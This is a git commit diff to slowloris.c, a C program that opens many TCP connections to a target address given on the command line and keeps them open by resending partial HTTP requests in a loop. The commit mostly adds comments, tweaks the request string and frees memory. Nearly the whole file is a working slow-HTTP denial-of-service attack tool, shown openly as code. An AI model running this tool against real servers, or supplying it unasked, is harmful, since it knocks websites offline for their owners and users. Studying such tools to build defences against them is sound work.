cfa8104d10351aab5b39f95dd5c5e6789d7fca35
Henry Warren <henrysdev@gmail.com>
2017-08-09 20:50:30 -0500

    added comments + cleaned up debugging logic

--- slowloris.c
+++ slowloris.c
@@ -16,28 +16,36 @@
 #define ALIVE_LOOP_DELAY 4
 #define MAX_PACKET_SIZE 512
 
-
+// creates a new connection and returns a pointer to the socket that
+// has been created
 int * initConnection(char* target)
 {
+	// declare and initialize socket
 	struct sockaddr_in svr_address;
 	int32_t * tcp_socket = malloc(sizeof(int));
 	*tcp_socket = socket(AF_INET, SOCK_STREAM, 0); 
+
+	// file control and time declarations to allow for connection timeout
 	fcntl(*tcp_socket, F_SETFL, O_NONBLOCK);
 	fd_set fdset;
 	struct timeval tv;
 
+	// assign socket attribute appropriate values
 	svr_address.sin_family = AF_INET;
 	svr_address.sin_port = htons(DEFAULT_PORT);
 	svr_address.sin_addr.s_addr = inet_addr(target);
 	memset(&(svr_address.sin_zero), '\0', 8);
 
+	// attempt connection to remote machine
 	connect(*tcp_socket, (struct sockaddr *)&svr_address, sizeof(struct sockaddr));
 
+	// timeout condition
 	FD_ZERO(&fdset);
 	FD_SET(*tcp_socket, &fdset);
 	tv.tv_sec = TIMEOUT;
 	tv.tv_usec = 0;
 
+	// attempt connection before timeout
 	if (select(*tcp_socket + 1, NULL, &fdset, NULL, &tv) == 1)
 	{
 		int32_t so_error;
@@ -47,6 +55,7 @@ int * initConnection(char* target)
 
 		if (!so_error)
 		{
+			// return pointer to successfully connected socket if no error occurred
 			return tcp_socket;
 		}
 	}
@@ -55,13 +64,13 @@ int * initConnection(char* target)
 	return NULL;
 }
 
+// formats a standard HTTP request given a series of parameters 
 char * formHttpRequest(char* url_path, char* host_address, char* request_body, uint32_t cont_len_hdr)
 {
 	char * http_request = malloc(sizeof(char) * MAX_PACKET_SIZE);
 	snprintf(http_request, MAX_PACKET_SIZE, 
 		"GET %s HTTP/1.1\r\n"
 		"Host: %s\r\n"
-		"Keep-Alive: timeout=15, max=100"
 		"Content-type: application/x-www-form-urlencoded\r\n"
 		"Content-length: %d\r\n\r\n"
 		"%s\r\n", url_path, host_address, cont_len_hdr, request_body);
@@ -70,6 +79,7 @@ char * formHttpRequest(char* url_path, char* host_address, char* request_body, u
 
 int main(int argc, char* argv[])
 {
+	// check for correct number of arguments
 	if(argc != 3)
 	{
 		printf("%s\n", "Incorrect number of arguments. Correct format: ");
@@ -77,12 +87,16 @@ int main(int argc, char* argv[])
 		return 0;
 	}
 	
+	// parse arguments
 	char* target_address = argv[1];
 	int num_conns = atoi(argv[2]);
 
+	// create array to hold sockets
 	int32_t* open_conns[num_conns];
 	int32_t actv_cnt = 0;
 	int32_t i;
+
+	// try to establish connection for every socket
 	for(i = 0; i < num_conns; i++)
 	{
 		int32_t* resp = initConnection(target_address);
@@ -92,12 +106,13 @@ int main(int argc, char* argv[])
 		}
 		else
 		{
-			printf("%s\n", "connection established");
+			printf("%s%d\n", "connection established ",actv_cnt);
 			open_conns[actv_cnt] = resp;
 			++actv_cnt;
 		}
 	}
 
+	// copy over connections that succeeded to new array
 	int32_t* active_conns[actv_cnt];
 	memcpy(active_conns, open_conns, sizeof(active_conns) );
 	
@@ -108,15 +123,15 @@ int main(int argc, char* argv[])
 		for(i = 0; i < actv_cnt; i++)
 		{
 			char* url_path = "/projects";
-			char* request_body = "pranav_pradeep";
-			unsigned int cont_len_hdr = strlen(request_body);
+			char* request_body = "abc123";
+			uint32_t cont_len_hdr = strlen(request_body);
 
+			// formatted http request string to be sent
 			char* http_request = formHttpRequest(url_path, target_address, request_body, cont_len_hdr);
 			
 			int32_t resp;
-
 			resp = write(*active_conns[i], http_request, strlen(request_body) + 1);
-			printf("%s\n", http_request);
+
 			if(resp < 0)
 			{
 				printf("%s\n", "failed to send HTTP request");
@@ -125,7 +140,9 @@ int main(int argc, char* argv[])
 			{
 				printf("%s\n", "sent stay alive packet successfully");
 			}
+			free(http_request);
 		}
+		// delay before sending next wave of packets
 		sleep(ALIVE_LOOP_DELAY);
 	}
 
